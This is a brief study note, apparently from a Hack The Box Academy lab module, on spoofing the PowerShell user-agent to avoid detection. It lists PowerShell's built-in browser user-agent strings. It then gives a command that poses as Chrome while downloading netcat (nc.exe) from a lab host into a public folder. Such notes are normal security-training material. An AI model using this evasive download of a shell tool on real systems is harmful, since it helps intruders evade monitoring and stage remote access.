Changing the user-agent to avoid detection
############################################

Date: 2024-11-04 11:16

Status:

Tags:

Listing user-agents in PowerShell
************************************
.. code-block:: console

   PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Example 1: Changing in PowerShell

.. code-block:: console


   PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
   PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

References
***************
https://academy.hackthebox.com/module/24/section/163
